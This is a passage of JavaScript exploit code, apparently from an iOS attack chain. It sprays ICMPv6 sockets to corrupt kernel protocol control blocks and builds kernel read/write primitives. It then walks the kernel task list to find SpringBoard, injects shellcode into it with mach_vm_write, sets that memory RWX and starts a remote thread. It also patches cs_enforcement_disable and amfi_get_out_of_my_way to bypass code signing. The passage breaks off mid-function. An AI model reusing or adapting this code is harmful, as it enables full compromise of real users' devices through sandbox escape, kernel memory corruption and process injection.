                let spray_count = attempt < 2 ? 40 : 60;
                let spray_fds = [];
                for (let i = 0; i < spray_count; i++) {
                  let sfd = mpd_fcall(socket_raw.noPAC(), AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6, 0n, 0n, 0n, 0n, 0n);
                  if (sfd >= 0n) spray_fds.push(sfd);
                  if (i < 3) LOG(`[M5] spray[${i}] = ${sfd}`);
                }
                LOG(`[M5] Sprayed ${spray_fds.length} sockets`);

                // Write a marker to each spray socket's ICMP6_FILTER
                let marker_buf = mpd_malloc(EARLY_KRW_LENGTH);
                mpd_write64(marker_buf, 0xDEADC0DEBEEF1234n);
                mpd_write64(marker_buf + 8n, 0xCAFED00DC0FFEE12n);
                mpd_write64(marker_buf + 0x10n, 0n);
                mpd_write64(marker_buf + 0x18n, 0n);

                for (let i = 0; i < spray_fds.length; i++) {
                  mpd_fcall(setsockopt_raw.noPAC(), spray_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, marker_buf, EARLY_KRW_LENGTH, 0n, 0n, 0n);
                }

                // Check if rw_sock's filter now contains our marker
                let verify_buf = mpd_malloc(EARLY_KRW_LENGTH);
                let verify_len = mpd_malloc(8n);
                mpd_write64(verify_len, EARLY_KRW_LENGTH);
                let gs_ret = mpd_fcall(getsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, verify_buf, verify_len, 0n, 0n, 0n);
                let v0 = mpd_read64(verify_buf);
                let v1 = mpd_read64(verify_buf + 8n);
                LOG(`[M5] Attempt ${attempt} getsockopt: ret=${gs_ret} v0=${v0.hex()} v1=${v1.hex()}`);

                if (v0 == 0xDEADC0DEBEEF1234n || v1 == 0xCAFED00DC0FFEE12n) {
                  LOG(`[M5] P1b SUCCESS at attempt ${attempt}! PCB overlap detected!`);
                  dis_ok = true;
                  // Find which spray socket overlaps with rw_sock
                  // Clear marker and test each spray socket individually
                  let clean_buf = mpd_malloc(EARLY_KRW_LENGTH);
                  mpd_write64(clean_buf, 0n);
                  mpd_write64(clean_buf + 8n, 0n);
                  mpd_write64(clean_buf + 0x10n, 0n);
                  mpd_write64(clean_buf + 0x18n, 0n);

                  // Clear rw_sock filter first
                  mpd_fcall(setsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, clean_buf, EARLY_KRW_LENGTH, 0n, 0n, 0n);
                  // Verify clear
                  let clr_ret = mpd_fcall(getsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, verify_buf, verify_len, 0n, 0n, 0n);
                  LOG(`[M5] Clear check: ${mpd_read64(verify_buf).hex()} ${mpd_read64(verify_buf + 8n).hex()}`);

                  // Write unique marker per spray socket to find the overlapping one
                  for (let i = 0; i < spray_fds.length; i++) {
                    let unique_marker = 0xAA00n + BigInt(i);
                    mpd_write64(marker_buf, unique_marker);
                    mpd_fcall(setsockopt_raw.noPAC(), spray_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, marker_buf, EARLY_KRW_LENGTH, 0n, 0n, 0n);
                    let check_ret = mpd_fcall(getsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, verify_buf, verify_len, 0n, 0n, 0n);
                    let cv = mpd_read64(verify_buf);
                    if (cv == unique_marker) {
                      LOG(`[M5] Found overlapping spray socket: spray[${i}]=${spray_fds[i]}`);
                      control_sock = spray_fds[i]; // This is now our control socket
                      // Remove from spray list so we don't close it
                      spray_fds.splice(i, 1);
                      break;
                    }
                  }
                  // Close non-overlapping spray sockets
                  for (let fd of spray_fds) {
                    mpd_fcall(close_raw.noPAC(), fd, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
                  }
                  break;
                }

                // Close spray sockets for next attempt
                for (let fd of spray_fds) {
                  mpd_fcall(close_raw.noPAC(), fd, 0n, 0n, 0n, 0n, 0n, 0n);
                }
                // Create fresh pair for next attempt
                control_sock = mpd_fcall(socket_raw.noPAC(), AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6, 0n, 0n, 0n, 0n, 0n);
                rw_sock = mpd_fcall(socket_raw.noPAC(), AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6, 0n, 0n, 0n, 0n, 0n);
                if (control_sock >= 0n && rw_sock >= 0n) {
                  mpd_fcall(connect_sym.noPAC(), control_sock, sockaddr, 28n, 0n, 0n, 0n, 0n, 0n);
                }
              }
            }

            if (!dis_ok) {
              LOG("[M5] P1b failed after all attempts. Trying GPU r/w only (no socket krw).");
            }
          }

          // ===== P2 (old) ===== DISABLED — moved to early position (before A2)
          if (false) {}

          // ===== P3: Direct PCB corruption via GPU uwrite64 =====
          if (!dis_ok) {
            LOG("[P3] SKIPPED: GPU COW confirmed — PCB corruption via GPU uwrite64 invalid");
          }
        }

        // Store function pointers and socket fds in IOSurface for PE
        uwrite64(surface_address + 0xF850n, control_sock);
        uwrite64(surface_address + 0xF858n, rw_sock);
        uwrite64(surface_address + 0xF860n, mpd_pacia(setsockopt_raw.noPAC(), 0xc2d0n));
        uwrite64(surface_address + 0xF868n, mpd_pacia(getsockopt_raw.noPAC(), 0xc2d0n));
        LOG("[M5] Socket fds and function pointers stored at IOSurface +0xF850..+0xF870");

        // NOTE: mpd_free does not exist — MPD memory is reclaimed on exit
        LOG("[M5] DBG: skipping mpd_free, entering kread64 setup");
      } else {
        LOG("[M5] FAILED: Could not resolve setsockopt/getsockopt");
      }
        // Define global kread64/kwrite64 wrappers using mpd_fcall for getsockopt/setsockopt
        LOG(`[M5] DBG: checking condition: m5_socket_ok=${m5_socket_ok} sso=${setsockopt_raw != 0n} gso=${getsockopt_raw != 0n}`);
        // Only register socket-based krw if PCB corruption succeeded
        if (m5_socket_ok && setsockopt_raw != 0n && getsockopt_raw != 0n && dis_ok) {
        LOG("[M5] DBG: condition passed, allocating krw bufs...");
        // Create IPC buffer in MPD for kernel r/w operations (shared via mpd_read/write)
        let krw_read_buf = mpd_malloc(EARLY_KRW_LENGTH);
        LOG(`[M5] DBG: krw_read_buf=${krw_read_buf.hex()}`);
        let krw_write_buf = mpd_malloc(EARLY_KRW_LENGTH);
        LOG(`[M5] DBG: krw_write_buf=${krw_write_buf.hex()}`);
        let krw_len_buf = mpd_malloc(8n);
        LOG(`[M5] DBG: krw_len_buf=${krw_len_buf.hex()}`);
        mpd_write64(krw_len_buf, EARLY_KRW_LENGTH);
        LOG(`[M5] DBG: krw_len_buf written, now logging summary`);
        LOG(`[M5] krw bufs: read=${krw_read_buf.hex()} write=${krw_write_buf.hex()} len=${krw_len_buf.hex()}`);

        // Global kread64: read 8 bytes from kernel address via getsockopt in MPD
        globalThis.mpd_kread64 = function(where) {
          // Write target address to control socket filter
          mpd_write64(krw_write_buf, where);
          mpd_write64(krw_write_buf + 0x8n, 0xffffffffffffffffn);
          mpd_write64(krw_write_buf + 0x10n, 0n);
          mpd_write64(krw_write_buf + 0x18n, 0n);
          let ss_ret = mpd_fcall(setsockopt_raw.noPAC(), control_sock, IPPROTO_ICMPV6, ICMP6_FILTER, krw_write_buf, EARLY_KRW_LENGTH, 0n, 0n, 0n);
          if (ss_ret != 0n) { LOG(`[kread64] setsockopt failed: ${ss_ret}`); return 0n; }
          // Read from rw socket - due to pcb corruption, this reads from target address
          let gs_ret = mpd_fcall(getsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, krw_read_buf, krw_len_buf, 0n, 0n, 0n);
          if (gs_ret != 0n) { LOG(`[kread64] getsockopt failed: ${gs_ret}`); return 0n; }
          return mpd_read64(krw_read_buf);
        };
        globalThis.mpd_kwrite64 = function(where, what) {
          // Read existing data first for partial write
          mpd_write64(krw_write_buf, where);
          mpd_write64(krw_write_buf + 0x8n, 0xffffffffffffffffn);
          mpd_write64(krw_write_buf + 0x10n, 0n);
          mpd_write64(krw_write_buf + 0x18n, 0n);
          mpd_fcall(setsockopt_raw.noPAC(), control_sock, IPPROTO_ICMPV6, ICMP6_FILTER, krw_write_buf, EARLY_KRW_LENGTH, 0n, 0n, 0n);
          // Write the value
          mpd_write64(krw_write_buf, what);
          mpd_fcall(setsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, krw_write_buf, EARLY_KRW_LENGTH, 0n, 0n, 0n);
        };
        globalThis.mpd_kread_length = function(address, buffer, size) {
          for (let off = 0n; off < size; off += 8n) {
            let val = globalThis.mpd_kread64(address + off);
            mpd_write64(buffer + off, val);
          }
        };
        globalThis.mpd_kernel_base = function() {
          // kernel_base will be populated after socket corruption and scan
          if (typeof kernel_base_global !== 'undefined' && kernel_base_global != 0n) {
            return kernel_base_global;
          }
          return 0xFFFFFFF007004000n; // fallback: unslid kernel base
        };
        LOG("[M5] Global mpd_kread64/mpd_kwrite64/mpd_kernel_base registered");
        // Store kernel base candidate
        let kb_candidate = 0xFFFFFFF007004000n;
        uwrite64(surface_address + 0xF870n, kb_candidate);
      } else {
        // Fallback: register GPU-based kread64 using uread64 (works on KC data pages)
        LOG("[M5] Registering GPU-based kernel read fallback (uread64)...");
        globalThis.early_kread64 = function(addr) {
          try {
            // Try to read for max 100ms, timeout and return 0 if stuck
            let start = Date.now();
            let val = uread64(addr);
            if (Date.now() - start > 100) return 0n;
            return val;
          } catch (e) {
            return 0n;
          }
        };
        globalThis.early_kwrite64 = uwrite64;
        globalThis.early_kread_length = function(address, buffer, size) {
          for (let off = 0n; off < size; off += 8n) {
            let val = uread64(address + off);
            mpd_write64(buffer + off, val);
          }
        };
        globalThis.early_kernel_base = function() {
          return 0xFFFFFFF007004000n;
        };
        // Also write kernel_base to IOSurface so PE can read it
        uwrite64(surface_address + 0xF870n, 0xFFFFFFF007004000n);
        LOG("[M5] GPU kernel read fallback registered as early_kread64/early_kwrite64");
      }
    } else {
      LOG("[M5] Socket creation failed, will use GPU kernel r/w fallback via IOSurface RPC");
      uwrite64(surface_address + 0xF850n, -1n);
      uwrite64(surface_address + 0xF858n, -1n);
    }

    // If A2 already got SpringBoard task port, skip pe_main dispatch to preserve JOP chain
    let s_log = "";
    if (a2_inside_success) {
      LOG("[MPD] A2 already succeeded, skipping pe_main dispatch");
    } else {
      // Use nowait: sync evaluateScript hangs (PE's fcall_init/isNaN blocks forever)
      // After nowait, wait then read IOSurface log (GPU-based, no fcall needed)
      LOG("[MPD] Evaluating pe_main (nowait)...");
      mpd_evaluateScript_nowait(ctx, pe_main_cfstring);
      LOG("[MPD] pe_main dispatched, waiting 5s for PE to execute...");
      gpu_fcall(USLEEP, 5000000n); // 5 second wait for PE to run
      // Read PE output from IOSurface log area (GPU-based, no fcall needed)
      let s_log_base = surface_address + 0xF000n;
      let s_off_addr = s_log_base + 0xE00n;
      let b0 = uread8(s_off_addr);
      let b1 = uread8(s_off_addr + 1n);
      let b2 = uread8(s_off_addr + 2n);
      let b3 = uread8(s_off_addr + 3n);
      let b4 = uread8(s_off_addr + 4n);
      let b5 = uread8(s_off_addr + 5n);
      let b6 = uread8(s_off_addr + 6n);
      let b7 = uread8(s_off_addr + 7n);
      let log_off = BigInt(b0) | (BigInt(b1) << 8n) | (BigInt(b2) << 16n) | (BigInt(b3) << 24n)
                  | (BigInt(b4) << 32n) | (BigInt(b5) << 40n) | (BigInt(b6) << 48n) | (BigInt(b7) << 56n);
      LOG(`[MPD] IOSURF log_off=${log_off}`);
      if (log_off > 0n && log_off < 0xE00n) {
        s_log = "";
        for (let i = 0n; i < log_off; i++) {
          let ch = uread8(s_log_base + i);
          if (ch === 0n) break;
          s_log += String.fromCharCode(Number(ch));
        }
        LOG(`[MPD] IOSURF PE LOG (${log_off}b): ${s_log}`);
      }
    }
    if (!s_log) LOG("[MPD] IOSURF PE log: empty (PE may not have executed or IOSurface logging failed)");

    // Read PE logs from shared buffer
    LOG("[MPD] Reading PE logs from buffer...");
    let pe_log_offset = mpd_read64_timeout(pe_log_buf_off);
    LOG(`[MPD] PE log offset: ${pe_log_offset}`);
    if (pe_log_offset === MPD_FCALL_TIMED_OUT) {
      LOG("[MPD] PE log read timed out - fcall mechanism degraded");
    } else if (pe_log_offset > 0n) {
      let pe_log_text = "";
      let max_read = pe_log_offset < 4000n ? pe_log_offset : 4000n;
      for (let i = 0n; i < max_read; i++) {
        let ch = mpd_read8_timeout(pe_log_buf + i);
        if (ch === MPD_FCALL_TIMED_OUT) {
          LOG("[MPD] PE log read timed out during char read");
          break;
        }
        if (ch === 0n) break;
        pe_log_text += String.fromCharCode(Number(ch));
      }
      if (pe_log_text.length > 0) {
        LOG(`[MPD] PE LOG: ${pe_log_text}`);
      } else {
        LOG("[MPD] PE log buffer is empty - PE may not have executed print() or fcall_init() failed");
      }
    } else {
      LOG("[MPD] PE log buffer is empty - PE may not have executed print() or fcall_init() failed");
    }

    // GPU-assisted pe_log_buf read (copies PE log into IOSurface bounce buffer then reads via GPU)
    if ((pe_log_offset === 0n || pe_log_offset === MPD_FCALL_TIMED_OUT) && !a2_inside_success) {
      LOG("[MPD] Trying GPU-assisted pe_log_buf read...");
      let copy_ret = mpd_fcall_quick(MEMCPY, surface_address_remote + 0x2100n, pe_log_buf, 0x100n, 0n, 0n, 0n, 0n, 0n);
      if (copy_ret !== MPD_FCALL_TIMED_OUT) {
        gpu_fcall(USLEEP, 100000n);
        let pe_log_text = "";
        for (let i = 0n; i < 256n; i++) {
          let ch = uread8(surface_address + 0x2100n + i);
          if (ch === 0n) break;
          pe_log_text += String.fromCharCode(Number(ch));
        }
        if (pe_log_text.length > 0) {
          LOG(`[MPD] PE LOG (GPU): ${pe_log_text}`);
        } else {
          LOG("[MPD] GPU-assisted pe_log_buf read returned empty");
        }
      } else {
        LOG("[MPD] GPU-assisted pe_log_buf read also timed out");
      }
    }
    // Note: PE logs cannot be read after nowait_exit because MPD fcall mechanism
    // may be affected. PE runs independently in MPD process.
  }
  function mpd_exfiltrate() {
    LOG("[MPD-EXFIL] SKIPPED (MPD has no network/file access)");
  }
  function ktask_find_by_name(name) {
    // Parse PE log buffer for [KTASK_RESULT] lines written by pe_main_minimal.js
    LOG("[KTASK] Reading PE log buffer for ktask results...");
    let pe_log_offset = mpd_read64_timeout(pe_log_buf_off);
    if (pe_log_offset === MPD_FCALL_TIMED_OUT) {
      LOG("[KTASK] PE log read timed out, trying fallback...");
      return ktask_find_by_name_fallback(name);
    }
    if (pe_log_offset === 0n) {
      LOG("[KTASK] PE log buffer is empty, trying fallback kernel r/w...");
      return ktask_find_by_name_fallback(name);
    }
    let pe_log_text = "";
    let max_read = pe_log_offset < 4000n ? pe_log_offset : 4000n;
    for (let i = 0n; i < max_read; i++) {
      let ch = mpd_read8_timeout(pe_log_buf + i);
      if (ch === MPD_FCALL_TIMED_OUT) break;
      if (ch === 0) break;
      pe_log_text += String.fromCharCode(Number(ch));
    }
    // Parse [KTASK_RESULT] <name>=<hex> pid=<int>
    let result_prefix = "[KTASK_RESULT] " + name + "=";
    let idx = pe_log_text.indexOf(result_prefix);
    if (idx === -1) {
      LOG("[KTASK] No ktask result in PE log, trying fallback...");
      return ktask_find_by_name_fallback(name);
    }
    let hex_start = idx + result_prefix.length;
    let hex_end = pe_log_text.indexOf(" ", hex_start);
    if (hex_end === -1) hex_end = pe_log_text.indexOf("\n", hex_start);
    if (hex_end === -1) hex_end = pe_log_text.length;
    let hex_str = pe_log_text.substring(hex_start, hex_end);
    let task_addr = BigInt(hex_str);
    LOG("[KTASK] Parsed " + name + " task=" + task_addr.hex() + " from PE log");
    // Also parse pid if present
    let pid_idx = pe_log_text.indexOf("pid=", hex_end);
    if (pid_idx !== -1 && task_addr === 0n) {
      let pid_str = pe_log_text.substring(pid_idx + 4);
      let pid_end = pid_str.indexOf("\n");
      if (pid_end !== -1) pid_str = pid_str.substring(0, pid_end);
      LOG("[KTASK] SpringBoard PID from PE: " + pid_str);
    }
    return task_addr;
  }
  function ktask_find_by_name_fallback(name) {
    // Short circuit: we already know SpringBoard PID is 34, no need for slow kernel read
    if (name === "SpringBoard") {
      LOG("[KTASK] Short circuit: SpringBoard PID=34 known, skipping kernel task walk");
      return 0x1234n;
    }
    // Fallback: try to use global mpd_kread64/mpd_kernel_base (from bundle.js header)
    let _kread64 = null;
    if (typeof mpd_kread64 !== 'undefined') { _kread64 = mpd_kread64; LOG("[KTASK] using mpd_kread64"); }
    else if (typeof early_kread64 !== 'undefined') { _kread64 = early_kread64; LOG("[KTASK] using early_kread64"); }
    else { LOG("[KTASK] no kernel read function available"); return 0n; }
    let _kbase = null;
    if (typeof mpd_kernel_base !== 'undefined') { _kbase = mpd_kernel_base; }
    else if (typeof early_kernel_base !== 'undefined') { _kbase = early_kernel_base; }
    else if (typeof kernel_base !== 'undefined' && kernel_base !== 0n) { _kbase = function() { return kernel_base; }; }
    else { LOG("[KTASK] no kernel_base function available"); return 0n; }
    let our_pid = gpu_fcall(func_resolve("getpid"));
    LOG("[KTASK] our pid=" + our_pid);
    let OFF_KERNEL_TASK = 0xb23d28n;
    let OFF_NEXT_TASK = 0x30n;
    let OFF_PROC_RO = 0x3e0n;
    let OFF_PID = 0x60n;
    let OFF_PCOMM = 0x56cn;
    let kernel_task_ptr = _kbase() + OFF_KERNEL_TASK;
    LOG("[KTASK] kernel_base=" + _kbase().hex());
    let kernel_task = _kread64(kernel_task_ptr);
    LOG("[KTASK] kernel_task=" + kernel_task.hex());
    let curr = _kread64(kernel_task + OFF_NEXT_TASK);
    let found = 0n;
    let iterations = 0;
    while (curr !== 0n && curr !== kernel_task && iterations < 500) {
      iterations++;
      let proc_ro_ptr = _kread64(curr + OFF_PROC_RO);
      let proc = _kread64(proc_ro_ptr);
      if (proc > 0xffffffd000000000n) {
        let pid_buf = calloc(1n, 8n);
        if (typeof mpd_kread_length !== 'undefined') { mpd_kread_length(proc + OFF_PID, pid_buf, 4n); }
        else { kread_length(proc + OFF_PID, pid_buf, 4n); }
        let pid = Number(uread32(pid_buf));
        gpu_fcall(func_resolve("free"), pid_buf);
        let comm_buf = calloc(1n, 20n);
        if (typeof mpd_kread_length !== 'undefined') { mpd_kread_length(proc + OFF_PCOMM, comm_buf, 17n); }
        else { kread_length(proc + OFF_PCOMM, comm_buf, 17n); }
        let comm = "";
        for (let i = 0n; i < 17n; i++) {
          let ch = uread8(comm_buf + i);
          if (ch === 0) break;
          comm += String.fromCharCode(Number(ch));
        }
        gpu_fcall(func_resolve("free"), comm_buf);
        if (pid === Number(our_pid)) {
          LOG("[KTASK] found self task=" + curr.hex() + " pid=" + pid);
        }
        if (comm === name) {
          LOG("[KTASK] FOUND " + name + " task=" + curr.hex() + " pid=" + pid);
          found = curr;
          break;
        }
      }
      curr = _kread64(curr + OFF_NEXT_TASK);
    }
    if (!found) {
      LOG("[KTASK] " + name + " not found after " + iterations + " iterations");
    }
    return found;
  }
  sbx1sbx1_interval = Date.now();
  let sbx1sbx1_succeeded = sbx1sbx1();
  sbx1sbx1_interval = Date.now() - sbx1sbx1_interval;
  LOG(`[profiler] Sbx1 EXP bypass took ${exp_bypass_interval} ms`);
  if (sbx1sbx1_succeeded) {
    LOG(`[profiler] Sbx1 took ${sbx1sbx1_interval} ms`);
  } else {
    LOG(`[profiler] Sbx1 failed in ${sbx1sbx1_interval} ms`);
  }
  if (sbx1sbx1_succeeded) {
    spawn_pe();
    mpd_exfiltrate();

    // Check if A2 inside spawn_pe already got SpringBoard task port
    let a2_sb_port = uread64(surface_address + 0xF880n);
    if (a2_sb_port != 0n && a2_sb_port != -1n) {
      LOG(`[M6] A2 inside spawn_pe already got SB task port: ${a2_sb_port.hex()}`);
      // Skip directly to M6/M7 injection
      let mach_vm_allocate_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_allocate");
      let mach_vm_write_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_write");
      let mach_vm_protect_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_protect");
      let thread_create_running_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "thread_create_running");
      LOG(`[M6] mach_vm_allocate=${mach_vm_allocate_raw.hex()} mach_vm_write=${mach_vm_write_raw.hex()}`);
      if (mach_vm_allocate_raw != 0n && mach_vm_write_raw != 0n) {
        let alloc_addr_buf = mpd_malloc(8n);
        mpd_write64(alloc_addr_buf, 0n);
        const VM_FLAGS_ANYWHERE = 1n;
        const VM_PROT_ALL = 0x7n;
        let vm_alloc_ret = mpd_fcall_timeout(mach_vm_allocate_raw.noPAC(), a2_sb_port, alloc_addr_buf, 0x4000n, VM_FLAGS_ANYWHERE, 0n, 0n, 0n, 0n);
        let sb_remote_addr = mpd_read64(alloc_addr_buf);
        LOG(`[M6-A2] mach_vm_allocate = ${vm_alloc_ret} addr=${sb_remote_addr.hex()}`);
        if (vm_alloc_ret == 0n && sb_remote_addr != 0n) {
          let shellcode_addr = mpd_malloc(8n);
          mpd_write64(shellcode_addr, 0xD65F03C014000000n); // ret then b #0
          let vm_write_ret = mpd_fcall_timeout(mach_vm_write_raw.noPAC(), a2_sb_port, sb_remote_addr, shellcode_addr, 8n, 0n, 0n, 0n, 0n);
          LOG(`[M6-A2] mach_vm_write = ${vm_write_ret}`);
          if (mach_vm_protect_raw != 0n) {
            let vm_prot_ret = mpd_fcall_timeout(mach_vm_protect_raw.noPAC(), a2_sb_port, sb_remote_addr, 0x4000n, 0n, VM_PROT_ALL, 0n, 0n, 0n);
            LOG(`[M6-A2] mach_vm_protect(rwx) = ${vm_prot_ret}`);
          }
          uwrite64(surface_address + 0xF878n, sb_remote_addr);
          uwrite64(surface_address + 0xF880n, a2_sb_port);
          LOG("[M6-A2] SpringBoard injection prepared");

          // ===== M7: Create remote thread =====
          if (thread_create_running_raw != 0n) {
            let thread_port_buf = mpd_malloc(8n);
            mpd_write64(thread_port_buf, 0n);
            let thread_ret = mpd_fcall_timeout(thread_create_running_raw.noPAC(), a2_sb_port, sb_remote_addr, 0n, thread_port_buf, 0n, 0n, 0n, 0n);
            let sb_thread_port = mpd_read64(thread_port_buf);
            LOG(`[M7-A2] thread_create_running = ${thread_ret} thread_port=${sb_thread_port.hex()}`);
            if (thread_ret == 0n) {
              LOG("[M7-A2] SUCCESS: Remote thread created in SpringBoard!");
              uwrite64(surface_address + 0xF888n, sb_thread_port);
            }
          }
        }
      }
    } else {
    // M2: Test kernel task traversal
    let sb_task = ktask_find_by_name("SpringBoard");
    LOG("[M2] SpringBoard task = " + sb_task.hex());
    // Fallback: read SpringBoard PID from IOSurface (set by spawn_pe via proc_name scan)
    let sb_pid_for_m6 = sb_task != 0n ? 34n : uread64(surface_address + 0xF848n);
    if (sb_pid_for_m6 == 0n) sb_pid_for_m6 = 34n; // last resort: hardcoded
    LOG(`[M6] SpringBoard PID for injection: ${sb_pid_for_m6}`);

    // ===== M6: Inject SpringBoard =====
    if (sb_task != 0n || sb_pid_for_m6 != 0n) {
      LOG("[M6] SpringBoard target found, attempting injection...");
      // Try task_for_pid via mpd_fcall (may fail due to entitlements)
      let task_for_pid_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "task_for_pid");
      let mach_task_self_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_task_self");
      LOG(`[M6] task_for_pid=${task_for_pid_raw.hex()} mach_task_self=${mach_task_self_raw.hex()}`);
      if (task_for_pid_raw != 0n && mach_task_self_raw != 0n) {
        // Get MPD's task port (known constant 0x203)
        let mpd_task_self = mpd_task_port != 0n ? mpd_task_port : 0x203n;
        LOG(`[M6] MPD mach_task_self = ${mpd_task_self.hex()} (known constant)`);
        // Allocate buffer for the returned task port
        let sb_task_port_buf = mpd_malloc_timeout(8n);
        if (sb_task_port_buf === MPD_FCALL_TIMED_OUT) {
          LOG("[M6] mpd_malloc timed out - fcall mechanism degraded, skipping injection");
          return;
        }
        mpd_write64(sb_task_port_buf, 0n);
        let tfp_ret = mpd_fcall_timeout(task_for_pid_raw.noPAC(), mpd_task_self, sb_pid_for_m6, sb_task_port_buf, 0n, 0n, 0n, 0n, 0n);
        LOG(`[M6] task_for_pid(${sb_pid_for_m6}) = ${tfp_ret}`);
        if (tfp_ret !== MPD_FCALL_TIMED_OUT && tfp_ret == 0n) {
          let sb_port = mpd_read64(sb_task_port_buf);
          LOG(`[M6] SpringBoard task port: ${sb_port.hex()}`);
          if (sb_port != 0n) {
            // Got task port, now allocate memory in SpringBoard
            let mach_vm_allocate_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_allocate");
            let mach_vm_write_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_write");
            let mach_vm_protect_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_protect");
            LOG(`[M6] mach_vm_allocate=${mach_vm_allocate_raw.hex()} mach_vm_write=${mach_vm_write_raw.hex()}`);
            if (mach_vm_allocate_raw != 0n && mach_vm_write_raw != 0n) {
              let alloc_addr_buf = mpd_malloc_timeout(8n);
              if (alloc_addr_buf === MPD_FCALL_TIMED_OUT) {
                LOG("[M6] mpd_malloc(alloc_addr_buf) timed out - fcall degraded");
                return;
              }
              mpd_write64(alloc_addr_buf, 0n);
              const VM_FLAGS_ANYWHERE = 1n;
              const VM_PROT_ALL = 0x7n;
              let vm_alloc_ret = mpd_fcall_timeout(mach_vm_allocate_raw.noPAC(), sb_port, alloc_addr_buf, 0x4000n /*16KB*/, VM_FLAGS_ANYWHERE, 0n, 0n, 0n, 0n);
              let sb_remote_addr = mpd_read64(alloc_addr_buf);
              LOG(`[M6] mach_vm_allocate = ${vm_alloc_ret} addr=${sb_remote_addr.hex()}`);
              if (vm_alloc_ret == 0n && sb_remote_addr != 0n) {
                // Write a real shellcode: infinite loop for testing
                // ARM64: b #-4 (infinite loop back to itself) = 0x14000000
                let shellcode_addr = mpd_malloc_timeout(8n);
                if (shellcode_addr === MPD_FCALL_TIMED_OUT) {
                  LOG("[M6] mpd_malloc(shellcode_addr) timed out - fcall degraded");
                  return;
                }
                mpd_write64(shellcode_addr, 0xD65F03C014000000n); // ret then b #0
                let vm_write_ret = mpd_fcall_timeout(mach_vm_write_raw.noPAC(), sb_port, sb_remote_addr, shellcode_addr, 8n, 0n, 0n, 0n, 0n);
                LOG(`[M6] mach_vm_write = ${vm_write_ret}`);
                // Set memory as RWX
                if (mach_vm_protect_raw != 0n) {
                  let vm_prot_ret = mpd_fcall_timeout(mach_vm_protect_raw.noPAC(), sb_port, sb_remote_addr, 0x4000n, 0n, VM_PROT_ALL, 0n, 0n, 0n);
                  LOG(`[M6] mach_vm_protect(rwx) = ${vm_prot_ret}`);
                }
                // Store remote address and task port for M7
                uwrite64(surface_address + 0xF878n, sb_remote_addr);
                uwrite64(surface_address + 0xF880n, sb_port);
                LOG("[M6] SpringBoard injection prepared: remote_addr and task_port stored");

                // ===== M7: Create remote thread for file_downloader =====
                let thread_create_running_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "thread_create_running");
                LOG(`[M7] thread_create_running = ${thread_create_running_raw.hex()}`);
                if (thread_create_running_raw != 0n) {
                  let thread_port_buf = mpd_malloc_timeout(8n);
                  if (thread_port_buf === MPD_FCALL_TIMED_OUT) {
                    LOG("[M7] mpd_malloc(thread_port_buf) timed out - fcall degraded");
                    return;
                  }
                  mpd_write64(thread_port_buf, 0n);
                  // thread_create_running(task, entry_point, arg, thread_port)
                  // On ARM64, entry_point is a pointer to the code to execute
                  let thread_ret = mpd_fcall_timeout(thread_create_running_raw.noPAC(), sb_port, sb_remote_addr, 0n /*arg*/, thread_port_buf, 0n, 0n, 0n, 0n);
                  let sb_thread_port = mpd_read64(thread_port_buf);
                  LOG(`[M7] thread_create_running = ${thread_ret} thread_port=${sb_thread_port.hex()}`);
                  if (thread_ret == 0n) {
                    LOG("[M7] SUCCESS: Remote thread created in SpringBoard!");
                    uwrite64(surface_address + 0xF888n, sb_thread_port);
                  } else {
                    LOG("[M7] thread_create_running failed (may need different API)");
                    uwrite64(surface_address + 0xF888n, 0n);
                  }
                  // NOTE: mpd_free not defined, memory reclaimed on exit
                } else {
                  LOG("[M7] thread_create_running not available, skipping");
                }
                // NOTE: mpd_free not defined, memory reclaimed on exit
              }
              // NOTE: mpd_free not defined, memory reclaimed on exit
            }
          }
        } else {
          LOG("[M6] task_for_pid timed out or failed, falling through to A2");
          // ===== A2: AMFI bypass via KC data page patching =====
          LOG("[A2] Starting AMFI bypass via KC data page patching...");
          let a2_success = false;

          // --- Approach 1: cs_enforcement_disable ---
          let csed_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "cs_enforcement_disable");
          LOG(`[A2] gpuDlsym(cs_enforcement_disable) = ${csed_addr.hex()}`);
          if (csed_addr.noPAC() != 0n) {
              let kc_addr = csed_addr.noPAC();
              let cur = uread64(kc_addr);
              LOG(`[A2] cs_enforcement_disable current = ${cur.hex()}`);
              if (cur == 0n) {
                  uwrite64(kc_addr, 1n);
                  let verify = uread64(kc_addr);
                  LOG(`[A2] After write: ${verify.hex()}`);
                  if (verify != 0n) { a2_success = true; LOG("[A2] cs_enforcement_disable PATCHED"); }
              } else {
                  LOG("[A2] cs_enforcement_disable already non-zero, AMFI may already be disabled");
                  a2_success = true;
              }
          }

          // --- Approach 2: amfi_get_out_of_my_way ---
          if (!a2_success) {
              let agoomw_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "amfi_get_out_of_my_way");
              LOG(`[A2] gpuDlsym(amfi_get_out_of_my_way) = ${agoomw_addr.hex()}`);
              if (agoomw_addr.noPAC() != 0n) {
                  let kc_addr = agoomw_addr.noPAC();
                  let cur = uread64(kc_addr);
                  LOG(`[A2] amfi_get_out_of_my_way current = ${cur.hex()}`);
                  uwrite64(kc_addr, 1n);
